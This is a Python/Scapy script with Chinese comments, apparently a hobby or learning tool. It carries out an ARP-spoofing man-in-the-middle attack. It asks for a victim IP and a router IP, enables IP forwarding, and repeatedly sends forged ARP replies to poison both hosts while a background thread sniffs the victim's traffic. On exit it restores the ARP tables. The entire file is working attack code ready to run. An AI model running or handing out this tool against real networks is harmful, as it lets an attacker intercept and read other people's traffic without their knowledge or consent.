from scapy.all import *
import sys
import os
import time
import threading
from scapy.layers.l2 import ARP, Ether

try:
	interface = input("[*] Enter Desired Interface: ") # windows系統 route PRINT -4 可查看
	victimIP = input("[*] Enter Victim IP: ") 
	gateIP = input("[*] Enter Router IP: ") 
except KeyboardInterrupt:
	print("\n[*] User Requested Shutdown")
	print("[*] Exiting...")
	sys.exit(1)

print("\n[*] Enabling IP Forwarding...\n")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") # linux系統
# subprocess.call('powershell Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "IPEnableRouter" -Value 1', shell=True) # windows系統

def get_mac(IP): # 取得目標IP的MAC位址
	conf.verb = 0 # 不顯示封包詳細資訊
	'''
	srp 發送封包並等待回應
    Ether(dst = "ff:ff:ff:ff:ff:ff") 發送廣播封包(ethernet)
    / 為封包組合符號
    ARP(pdst = IP) 建立ARP封包用來解析 IP 到 MAC 地址
    '''
	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
	for snd,rcv in ans:
		return rcv.sprintf(r"%Ether.src%") # 回傳目標IP的MAC位址

def reARP(): # 還原ARP表，因為attack完後會將ARP表改變
	print("\n[*] Restoring Targets...")
	victimMAC = get_mac(victimIP) # 取得目標IP的MAC位址
	gateMAC = get_mac(gateIP) # 取得路由器IP的MAC位址
	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7) # 欺騙路由器攻擊者mac是victim的mac
	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7) # 欺騙victim路由器mac是攻擊者mac
	print("[*] Disabling IP Forwarding...")
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	# subprocess.call('powershell Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "IPEnableRouter" -Value 0', shell=True)
	print("[*] Shutting Down...")
	sys.exit(1)

def trick(gm, vm): # 欺騙victim和gateway
	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm)) # 將gateway的mac改成victim的mac
	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm)) # 將victim的mac改成gateway的mac

def dosniff(interface,victimIP):
    while True:
        capture = sniff(filter=f"host {victimIP}",iface=interface,count=1)
        capture.summary()

def maninthemiddle():
	try:
		victimMAC = get_mac(victimIP)
	except Exception:
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		print("[!] Couldn't Find Victim MAC Address")
		print("[!] Exiting...")
		sys.exit(1)
	try:
		gateMAC = get_mac(gateIP)
	except Exception:
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		print("[!] Couldn't Find Gateway MAC Address")
		print("[!] Exiting...")
		sys.exit(1)
	print("[*] Poisoning Targets...")
	t = threading.Thread(target = dosniff, args = (interface,victimIP))
	t.start()
	print("[*] sniffing")
	while 1:
		try:
			trick(gateMAC, victimMAC)
			time.sleep(1.5)
		except KeyboardInterrupt:
			reARP()
			t.join()
			break
maninthemiddle()